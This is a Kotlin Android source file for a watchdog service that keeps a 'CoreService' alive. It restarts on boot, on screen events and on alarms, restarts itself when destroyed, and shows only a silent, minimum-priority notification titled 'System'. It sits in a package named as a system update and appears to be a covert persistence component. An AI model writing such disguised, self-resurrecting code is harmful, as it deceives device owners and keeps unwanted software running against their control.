package com.androidsystem.update.service

import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import java.util.concurrent.Executors

class WatchdogService : Service() {

    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var isRunning = false
    private var wakeLock: PowerManager.WakeLock? = null

    companion object {
        private const val TAG = "Watchdog"
        const val CHECK_INTERVAL = 60000L
        private const val WATCHDOG_PREFS = "watchdog_prefs"
        const val HEARTBEAT_KEY = "last_heartbeat"
        const val TIMEOUT_MS = 90000L
        const val CHANNEL_ID = "watchdog_ch"
        const val NOTIFICATION_ID = 102

        fun start(context: Context) {
            val intent = Intent(context, WatchdogService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(intent)
            else
                context.startService(intent)
        }
    }

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> checkCoreService()
                Intent.ACTION_SCREEN_OFF -> executor.schedule({ checkCoreService() }, 30, java.util.concurrent.TimeUnit.SECONDS)
            }
        }
    }

    private val bootReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
                intent.action == Intent.ACTION_LOCKED_BOOT_COMPLETED) {
                Log.d(TAG, "Boot detected")
                startCoreService()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Watchdog created")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN).apply {
                    setShowBadge(false)
                }
            )
        }
        startForeground(NOTIFICATION_ID,
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .build()
        )
        registerReceiver(screenReceiver, IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        })
        registerReceiver(bootReceiver, IntentFilter().apply {
            addAction(Intent.ACTION_BOOT_COMPLETED)
            addAction(Intent.ACTION_LOCKED_BOOT_COMPLETED)
        })
        startPeriodicCheck()
        scheduleAlarm()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        checkCoreService()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        executor.shutdownNow()
        try {
            unregisterReceiver(screenReceiver)
            unregisterReceiver(bootReceiver)
        } catch (e: Exception) { /* ignore */ }
        wakeLock?.let { if (it.isHeld) it.release() }
        scheduleRestart()
    }

    // FIX: ALLOW_WHILE_IDLE for restart
    private fun scheduleRestart(delayMs: Long = 5000L) {
        val restartIntent = Intent(this, WatchdogService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 0, restartIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        val triggerAt = System.currentTimeMillis() + delayMs
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
        } else {
            alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
        }
    }

    private fun startPeriodicCheck() {
        isRunning = true
        executor.scheduleAtFixedRate(
            { if (isRunning) checkCoreService() },
            0, CHECK_INTERVAL, java.util.concurrent.TimeUnit.MILLISECONDS
        )
    }

    private fun checkCoreService() {
        if (!isServiceRunning()) {
            Log.d(TAG, "CoreService not running, restarting")
            startCoreService()
        }
    }

    private fun startCoreService() {
        val intent = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
        else startService(intent)
    }

    // FIX: grace period — last == 0 means first boot, return true
    private fun isServiceRunning(): Boolean {
        val prefs = getSharedPreferences(WATCHDOG_PREFS, Context.MODE_PRIVATE)
        val last = prefs.getLong(HEARTBEAT_KEY, 0)
        if (last == 0L) return true // grace period on first boot
        return System.currentTimeMillis() - last < TIMEOUT_MS
    }

    private fun scheduleAlarm() {
        val alarmIntent = PendingIntent.getBroadcast(
            this, 0, Intent(this, WatchdogAlarmReceiver::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        (getSystemService(ALARM_SERVICE) as AlarmManager).setRepeating(
            AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 300000, alarmIntent
        )
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Watchdog:WakeLock")
            wakeLock?.acquire(10 * 60 * 1000L)
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock acquire failed", e)
        }
    }

    class WatchdogAlarmReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            Log.d(TAG, "Alarm triggered")
            start(context)
        }
    }
}
